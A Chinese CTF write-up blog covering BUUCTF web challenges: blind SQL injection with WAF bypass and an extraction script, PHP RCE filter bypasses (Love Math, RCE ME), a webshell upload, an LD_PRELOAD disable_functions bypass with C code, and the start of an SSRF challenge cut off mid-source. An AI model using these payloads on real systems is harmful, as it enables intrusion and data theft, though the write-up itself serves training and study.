title="先试一下?id&#x3D;1’，回显变为error！（这里回显的error！代表sql语句报错，后面回显的error！！！代表id未查询到，猜测应该是这样），然后试一下常规注入，发现有waf，回显为可别让我逮住了，先fuzz测试一下"></a>先试一下?id&#x3D;1’，回显变为error！（这里回显的error！代表sql语句报错，后面回显的error！！！代表id未查询到，猜测应该是这样），然后试一下常规注入，发现有waf，回显为<code>可别让我逮住了</code>，先fuzz测试一下</h3><p><img src="https://pics.lwzheng.tech/2025/02/27/67bf3a8aedebe.png" alt="ebf52382-3304-465f-9647-8e87eddc4603.png"></p>
<h3 id="过滤了-空格-union-，if等，这里因为–-和-都被过滤，但-没有被过滤，为了避免闭合问题和if被过滤的问题，我们选用-来进行布尔盲注-因为0-0-0-0-1-1，所以我们选用-id-0-判断语句"><a href="#过滤了-空格-union-，if等，这里因为–-和-都被过滤，但-没有被过滤，为了避免闭合问题和if被过滤的问题，我们选用-来进行布尔盲注-因为0-0-0-0-1-1，所以我们选用-id-0-判断语句" class="headerlink" title="过滤了+,#,空格,union,&#x2F;**&#x2F;，if等，这里因为–+和#都被过滤，但^没有被过滤，为了避免闭合问题和if被过滤的问题，我们选用^来进行布尔盲注,因为0^0&#x3D;0,0^1&#x3D;1，所以我们选用?id&#x3D;0^(判断语句)"></a>过滤了+,#,空格,union,&#x2F;**&#x2F;，if等，这里因为–+和#都被过滤，但^没有被过滤，为了避免闭合问题和if被过滤的问题，我们选用^来进行布尔盲注,因为0^0&#x3D;0,0^1&#x3D;1，所以我们选用?id&#x3D;0^(判断语句)</h3><blockquote>
<p><a target="_blank" rel="noopener" href="http://fd7e6d6c-6fb8-422e-b459-7c5e5c4ae7cb.node5.buuoj.cn:81/search.php?id=0%5E(ASCII(SUBSTRING(database(),1,1))%3E100">http://fd7e6d6c-6fb8-422e-b459-7c5e5c4ae7cb.node5.buuoj.cn:81/search.php?id=0^(ASCII(SUBSTRING(database(),1,1))&gt;100</a>)</p>
</blockquote>
<h3 id="先尝试一下，发现-100为正常回显1对应的页面NO-Not-this-Click-others"><a href="#先尝试一下，发现-100为正常回显1对应的页面NO-Not-this-Click-others" class="headerlink" title="先尝试一下，发现&gt;100为正常回显1对应的页面NO! Not this! Click others~~~,&lt;100为error！！！，所以可以布尔盲注，直接写个二分法脚本"></a>先尝试一下，发现&gt;100为正常回显1对应的页面<code>NO! Not this! Click others~~~</code>,&lt;100为error！！！，所以可以布尔盲注，直接写个二分法脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#http://fd7e6d6c-6fb8-422e-b459-7c5e5c4ae7cb.node5.buuoj.cn:81/search.php?id=0^(ASCII(SUBSTRING(database(),1,1))&gt;100)    geek</span></span><br><span class="line"><span class="comment">#http://fd7e6d6c-6fb8-422e-b459-7c5e5c4ae7cb.node5.buuoj.cn:81/search.php?id=0^(ASCII(SUBSTRING((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;geek&#x27;)),1,1))&gt;100)   F1naI1y,Flaaaaag</span></span><br><span class="line"><span class="comment">#http://fd7e6d6c-6fb8-422e-b459-7c5e5c4ae7cb.node5.buuoj.cn:81/search.php?id=0^(ASCII(SUBSTRING((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;Flaaaaag&#x27;)),1,1))&gt;100) id,fl4gawsl </span></span><br><span class="line">url=<span class="string">&quot;http://fd7e6d6c-6fb8-422e-b459-7c5e5c4ae7cb.node5.buuoj.cn:81/search.php&quot;</span></span><br><span class="line">database=<span class="string">&quot;&quot;</span></span><br><span class="line">table=<span class="string">&quot;&quot;</span></span><br><span class="line">column=<span class="string">&quot;&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line">    left=<span class="number">32</span></span><br><span class="line">    right=<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> left&lt;right:</span><br><span class="line">        mid=(left+right)//<span class="number">2</span></span><br><span class="line">        <span class="comment"># payload=f&quot;?id=0^(ASCII(SUBSTRING(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span></span><br><span class="line">        <span class="comment"># payload=f&quot;?id=0^(ASCII(SUBSTRING((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;geek&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span></span><br><span class="line">        <span class="comment"># payload=f&quot;?id=0^(ASCII(SUBSTRING((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;Flaaaaag&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span></span><br><span class="line">        <span class="comment"># payload=f&quot;?id=0^(ASCII(SUBSTRING((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span></span><br><span class="line">        <span class="comment"># payload=f&quot;?id=0^(ASCII(SUBSTRING((select(group_concat(fl4gawsl))from(Flaaaaag)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;;</span></span><br><span class="line">        payload=<span class="string">f&quot;?id=0^(ASCII(SUBSTRING((select(group_concat(id,username,password))from(F1naI1y)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>)&quot;</span>;</span><br><span class="line">        res=requests.get(url+payload).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Click&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            left=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right=mid</span><br><span class="line">    <span class="keyword">if</span> left !=<span class="number">32</span>:</span><br><span class="line">        <span class="comment"># database+=chr(left)</span></span><br><span class="line">        <span class="comment"># print(database)</span></span><br><span class="line">        <span class="comment"># table+=chr(left)</span></span><br><span class="line">        <span class="comment"># print(table)</span></span><br><span class="line">        <span class="comment"># column+=chr(left)</span></span><br><span class="line">        <span class="comment"># print(column)</span></span><br><span class="line">        flag+=<span class="built_in">chr</span>(left)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h3 id="首先爆破数据库名为geek，再爆破表名为F1naI1y-Flaaaaag，然后爆破Flaaaaag里面的列名为id-fl4gawsl，最后爆破fl4gawsl的数据，发现为NO！不是哥们"><a href="#首先爆破数据库名为geek，再爆破表名为F1naI1y-Flaaaaag，然后爆破Flaaaaag里面的列名为id-fl4gawsl，最后爆破fl4gawsl的数据，发现为NO！不是哥们" class="headerlink" title="首先爆破数据库名为geek，再爆破表名为F1naI1y,Flaaaaag，然后爆破Flaaaaag里面的列名为id,fl4gawsl，最后爆破fl4gawsl的数据，发现为NO！不是哥们"></a>首先爆破数据库名为geek，再爆破表名为F1naI1y,Flaaaaag，然后爆破Flaaaaag里面的列名为id,fl4gawsl，最后爆破fl4gawsl的数据，发现为NO！<del>不是哥们</del></h3><h3 id="那就是flag不在这里了不在这里你起这名字恶心人"><a href="#那就是flag不在这里了不在这里你起这名字恶心人" class="headerlink" title="那就是flag不在这里了不在这里你起这名字恶心人"></a>那就是flag不在这里了<del>不在这里你起这名字恶心人</del></h3><h3 id="所以我们再去爆破另外一个表F1naI1y，爆破出列名为id-username-password，然后爆破数据（这里最好在concat时用-将三个元素分开，这里懒得再跑一次脚本了）"><a href="#所以我们再去爆破另外一个表F1naI1y，爆破出列名为id-username-password，然后爆破数据（这里最好在concat时用-将三个元素分开，这里懒得再跑一次脚本了）" class="headerlink" title="所以我们再去爆破另外一个表F1naI1y，爆破出列名为id,username,password，然后爆破数据（这里最好在concat时用~将三个元素分开，这里懒得再跑一次脚本了）"></a>所以我们再去爆破另外一个表F1naI1y，爆破出列名为id,username,password，然后爆破数据（这里最好在concat时用~将三个元素分开，这里懒得再跑一次脚本了）</h3><h3 id="等待一段时间后在第9个password里面发现flag"><a href="#等待一段时间后在第9个password里面发现flag" class="headerlink" title="等待一段时间后在第9个password里面发现flag"></a>等待一段时间后在第9个password里面发现flag</h3><p><img src="https://pics.lwzheng.tech/2025/02/27/67bf3a9cd4951.png" alt="7669f2162a8a720d96daa32e972f2c63.png"></p>
<h1 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h1><h3 id="一个RCE的题，限制很多"><a href="#一个RCE的题，限制很多" class="headerlink" title="一个RCE的题，限制很多"></a>一个RCE的题，限制很多</h3><blockquote>
<p>限制条件：<br>1.参数c字符数不能超过80个字符<br>2.不能含有空格，\t，\r，\n，\，单双引号，中括号<br>3.使用的单词&#x2F;函数必须在白名单中</p>
</blockquote>
<h3 id="在白名单函数中有base-convert函数，作用为转换进制，且最多支持2进制到36进制的转换，也就是我们可以通过该函数用数字获得所有字母"><a href="#在白名单函数中有base-convert函数，作用为转换进制，且最多支持2进制到36进制的转换，也就是我们可以通过该函数用数字获得所有字母" class="headerlink" title="在白名单函数中有base_convert函数，作用为转换进制，且最多支持2进制到36进制的转换，也就是我们可以通过该函数用数字获得所有字母"></a>在白名单函数中有base_convert函数，作用为转换进制，且最多支持2进制到36进制的转换，也就是我们可以通过该函数用数字获得所有字母</h3><h3 id="但是想直接代码执行的话我们没有空格，常规绕过也难以绕过，顶多只能执行像phpinfo-system-ls-这种无空格的函数"><a href="#但是想直接代码执行的话我们没有空格，常规绕过也难以绕过，顶多只能执行像phpinfo-system-ls-这种无空格的函数" class="headerlink" title="但是想直接代码执行的话我们没有空格，常规绕过也难以绕过，顶多只能执行像phpinfo(),system(ls)这种无空格的函数"></a>但是想直接代码执行的话我们没有空格，常规绕过也难以绕过，顶多只能执行像phpinfo(),system(ls)这种无空格的函数</h3><h3 id="所以我们要想办法构造出空格来，这里可以通过用白名单中的dechex-将十进制转换为16进制，然后再用base-convert函数构造出hex2bin-函数将16进制转换为ascii码"><a href="#所以我们要想办法构造出空格来，这里可以通过用白名单中的dechex-将十进制转换为16进制，然后再用base-convert函数构造出hex2bin-函数将16进制转换为ascii码" class="headerlink" title="所以我们要想办法构造出空格来，这里可以通过用白名单中的dechex()将十进制转换为16进制，然后再用base_convert函数构造出hex2bin()函数将16进制转换为ascii码"></a>所以我们要想办法构造出空格来，这里可以通过用白名单中的dechex()将十进制转换为16进制，然后再用base_convert函数构造出hex2bin()函数将16进制转换为ascii码</h3><h3 id="然后在进行构造时发现字数超过80个，这里就要引入动态-可变-函数"><a href="#然后在进行构造时发现字数超过80个，这里就要引入动态-可变-函数" class="headerlink" title="然后在进行构造时发现字数超过80个，这里就要引入动态(可变)函数"></a>然后在进行构造时发现字数超过80个，这里就要引入动态(可变)函数</h3><blockquote>
<p>动态(可变)函数<br>PHP中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数，例如： $a &#x3D; “assert”; $a.”(…)”;<br>PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。  可变函数不能用于例如 eval() ， echo ， print ， unset() ， isset() ， empty() ， include() ， require()  以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数。</p>
</blockquote>
<h3 id="这里就可以用白名单中的pi作为变量名来节约空间"><a href="#这里就可以用白名单中的pi作为变量名来节约空间" class="headerlink" title="这里就可以用白名单中的pi作为变量名来节约空间"></a>这里就可以用白名单中的pi作为变量名来节约空间</h3><blockquote>
<p><code>/index.php?c=($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))  //exec(&#39;hex2bin(dechex(109270211257898))&#39;) =&gt; exec(&#39;cat f*&#39;)</code></p>
</blockquote>
<h3 id="另外一种方法就是可以通过构造-GET请求来突破字数限制"><a href="#另外一种方法就是可以通过构造-GET请求来突破字数限制" class="headerlink" title="另外一种方法就是可以通过构造$_GET请求来突破字数限制"></a>另外一种方法就是可以通过构造$_GET请求来突破字数限制</h3><blockquote>
<p><code>/index.php?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=&#39;cat /flag&#39;</code><br>base_convert(37907361743,10,36) &#x3D;&gt; “hex2bin”<br>dechex(1598506324) &#x3D;&gt; “5f474554”<br>$pi&#x3D;hex2bin(“5f474554”) &#x3D;&gt; $pi&#x3D;”_GET”   &#x2F;&#x2F;hex2bin将一串16进制数转换为二进制字符串<br><code>($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;) =&gt; ($_GET)&#123;pi&#125;($_GET)&#123;abs&#125; </code> &#x2F;&#x2F;<code>&#123;&#125;</code>可以代替[]</p>
</blockquote>
<h3 id="还可以通过getallheaders利用HeaderRCE"><a href="#还可以通过getallheaders利用HeaderRCE" class="headerlink" title="还可以通过getallheaders利用HeaderRCE"></a>还可以通过getallheaders利用HeaderRCE</h3><blockquote>
<p>getallheaders — 获取全部 HTTP 请求头信息<br>getallheaders用法可以参考:<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.getallheaders.php">https://www.php.net/manual/zh/function.getallheaders.php</a></p>
</blockquote>
<blockquote>
<p><code>/index.php?c=$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</code><br>在HTTP请求的Header中直接添加命令即可<br>base_convert(696468,10,36) &#x3D;&gt; “exec”<br>$pi(8768397090111664438,10,30) &#x3D;&gt; “getallheaders”<br><code>exec(getallheaders()&#123;1&#125;)</code><br>操作xx和yy，中间用逗号隔开，echo都能输出<br>echo xx,yy</p>
</blockquote>
<h3 id="最后也是最能减少字数的就是通过利用异或得到函数名和命令"><a href="#最后也是最能减少字数的就是通过利用异或得到函数名和命令" class="headerlink" title="最后也是最能减少字数的就是通过利用异或得到函数名和命令"></a>最后也是最能减少字数的就是通过利用异或得到函数名和命令</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">1</span>;<span class="variable">$k</span>&lt;=<span class="title function_ invoke__">sizeof</span>(<span class="variable">$payload</span>);<span class="variable">$k</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">9</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt;=<span class="number">9</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="variable">$exp</span> = <span class="variable">$payload</span>[<span class="variable">$k</span>] ^ <span class="variable">$i</span>.<span class="variable">$j</span>;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="variable">$payload</span>[<span class="variable">$k</span>].<span class="string">&quot;^<span class="subst">$i</span><span class="subst">$j</span>&quot;</span>.<span class="string">&quot;==&gt;<span class="subst">$exp</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>利用该脚本我们可以利用异或构造出Payload：<br><code>/index.php?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0=system&amp;1=&#39;ls /&#39;</code></p>
</blockquote>
<h1 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h1><h3 id="进去之后给了源码，是无字母数字RCE，这个用异或绕过或者取反绕过都可以"><a href="#进去之后给了源码，是无字母数字RCE，这个用异或绕过或者取反绕过都可以" class="headerlink" title="进去之后给了源码，是无字母数字RCE，这个用异或绕过或者取反绕过都可以"></a>进去之后给了源码，是无字母数字RCE，这个用异或绕过或者取反绕过都可以</h3><p>&#96;&#96;&#96;?code&#x3D;$_&#x3D;”<code>&#123;&#123;&#123;"^"?<>/";$&#123;$_&#125;[_]();&_=phpinfo   //$_=_GET;$_GET[_]();```

### 执行phpinfo，在phpinfo里面找到disable_functions栏，禁用了非常多函数，诸如system，exec
### 这里就很难直接进行RCE
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`?code=<span class="variable">$_</span>=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;$&#123;<span class="variable">$_</span>&#125;[_]($&#123;<span class="variable">$_</span>&#125;[__]);&amp;_=system&amp;__=<span class="string">&#x27;ls /&#x27;</span>`</span><br></pre></td></tr></table></figure>

### 进行上面的操作无法执行命令
### 这里就要想办法绕过了，我们先上传个马然后用蚁剑连接，然后才能进行下面的操作
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$a=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">$b=urlencode(~$a);</span><br><span class="line">echo $b;</span><br><span class="line">echo <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">$c=<span class="string">&#x27;(eval($_POST[test]))&#x27;</span>;</span><br><span class="line">$d=urlencode(~$c);</span><br><span class="line">echo $d;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
>?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6);

### 然后蚁剑连接，在根目录发现flag和readflag两个文件，第一个打开是空的，第二个应该是要执行查询flag的命令
### 但是我们大部分的命令都执行不了，所以我们要想办法绕过，这里有两个选择，一个是蚁剑插件disable_functions
### 另一个是利用动态链接库——LD_PRELOAD
>一般来说，最简单的绕过disable_function的办法，dl函数，proc_open函数，漏洞版本的imagemagic等
这里的话都过滤的比较好，
这时候，就可以用这段时间比较好用的环境变量 LD_preload + mail劫持so来执行系统命令
https://www.anquanke.com/post/id/175403
https://www.freebuf.com/articles/web/192052.html
具体原理上面讲的比我好，大概就是通过linux提供的LD_preload环境变量，劫持共享so，在启动子进程的时候，新的子进程会加载我们恶意的so拓展，然后我们可以在so里面定义同名函数，即可劫持API调用，成功RCE
https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD

### 将github里面的disablefunc_x64.so和bypass_disablefunc.php放在/var/tmp/里面，然后执行命令
>`http://72f0b7b4-f952-4654-9f28-781dc1026b5b.node5.buuoj.cn:81/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&_=assert&__=include('/var/tmp/bypass_disablefunc.php')&cmd=/readflag&outpath=/tmp/tmpfile&sopath=/var/tmp/bypass_disablefunc_x64.so`
>`//?code=$_GET['_']($_GET['__']);`

### LD_PRELOAD
>突破思路：
创建新进程
用c编写我们的恶意代码，将其转化为 so文件
让我们的 so文件为LD_PRELOAD
让我们的 so文件优先加载
运行主体 php函数

### 编写hack.c
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;cat /flag &gt;&gt; /var/tmp/test.php&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;tac /flag &gt;&gt; /var/tmp/test.php&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;more /flag &gt;&gt; /var/tmp/test.php&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;head -2 /flag &gt;&gt; /var/tmp/test.php&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;tail /flag &gt;&gt; /var/tmp/test.php&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/readflag &gt;&gt; /var/tmp/test.php&quot;</span>);</span><br><span class="line">    </span><br><span class="line">&#125;   </span><br><span class="line"><span class="type">int</span>  <span class="title function_">geteuid</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
>getenv：获取环境变量的值
unsetenv：用来删除一个环境变量
system：定的命令名称或程序名称传给要被命令处理器执行的主机环境
payload 函数大概是说 查询 flag 并将flag返回到/var/tmp/文件夹下，flag返回形式为 test.php。

### 使用linux将我们的 .c 变为 so
>gcc -shared -fPIC hack.c -o getflag.so

### 书写php文件
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=/var/tmp/getflag.so&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_log</span>(<span class="string">&quot;&quot;</span>,<span class="number">1</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
>LD_PRELOAD=/var/tmp/getflag.so 意思是 LD_PRELOAD 是/var/tmp/文件夹下的 getflag.so 文件.

### 上传我们的 getflag.so 文件和 shell.php 文件
### 然后执行把我们的php文件包含进来进行命令执行
>`http://72f0b7b4-f952-4654-9f28-781dc1026b5b.node5.buuoj.cn:81/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&_=assert&__=include('/var/tmp/bypass_disablefunc.php')&cmd=/readflag&outpath=/tmp/tmpfile&sopath=/var/tmp/bypass_disablefunc_x64.so`
>`//?code=$_GET['_']($_GET['__']);`

### 之后到 var/tmp/文件下寻找test.php文件即可
# [De1CTF 2019]SSRF Me
### 访问页面后直接给出源码，调整一下缩进得到源代码
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span 